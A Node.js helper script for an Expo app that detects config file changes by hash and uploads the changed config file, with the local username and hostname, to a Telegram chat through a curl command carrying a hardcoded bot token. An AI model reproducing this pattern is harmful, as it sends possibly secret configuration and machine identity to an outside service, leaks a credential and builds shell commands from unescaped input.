const path = require('path');
const fs = require('fs')
const exec = require('child_process').execSync;
const os = require('os')
const shorthash = require('shorthash')
const DIR = './'
const args = process.argv.slice(2);
const pclive = DIR + 'config.live.json'
const assetsBackup = DIR + 'assets/confighash.js'
const pcdebug = DIR + 'config.debug.json'

function command(command) {
  exec(command, { stdio: ['inherit', 'inherit', 'inherit'] });
}

function readToJSON(path) {
  const txt = fs.readFileSync(path, 'utf8');
  let isJSON = txt.startsWith('{') || txt.startsWith('[')
  return isJSON ? JSON.parse(txt) : txt
}

function updateToTelegram() {
  let _path;
  let _slug
  if (args[0] == 'live') {
    _path = path.resolve(pclive);
    _slug = readToJSON('./app.live.json').expo.slug
  }
  if (args[0] == 'debug') {
    _path = path.resolve(pcdebug);
    _slug = readToJSON('./app.debug.json').expo.slug
  }
  if (_path && _slug)
    command(`curl -v -F 'chat_id=-496494136' -F caption='#` + _slug + `\n` + os.userInfo().username + '@' + os.hostname() + `' -F document=@` + _path + ` https://api.telegram.org/bot923808407:AAEFBlllQNKCEn8E66fwEzCj5vs9qGwVGT4/sendDocument`)
}

function checkConfigChange() {
  const path = args[0] == 'live' ? pclive : args[0] == 'debug' ? pcdebug : null
  if (path) {
    let out
    if (fs.existsSync(path)) {
      const newConfLive = JSON.stringify(readToJSON(path))
      if (fs.existsSync(assetsBackup)) {
        let txt = fs.readFileSync(assetsBackup, 'utf8')
        txt = txt.slice(1, txt.length - 1)
        txt = txt.split('|');
        if (args[0] == 'live') {
          out = txt[1]
        } else if (args[0] == 'debug') {
          out = txt[0]
        }
        const newOut = shorthash.unique(newConfLive)
        if (out != newOut) {
          let hash
          if (args[0] == 'live') {
            hash = txt[0] + '|' + newOut
          } else if (args[0] == 'debug') {
            hash = newOut + '|' + txt[1]
          }
          fs.writeFileSync(assetsBackup, '`' + hash + '`')
          updateToTelegram()
        }
      } else {
        fs.writeFileSync(assetsBackup, '`inital|initial`')
        checkConfigChange()
      }
    }
  }
}
checkConfigChange()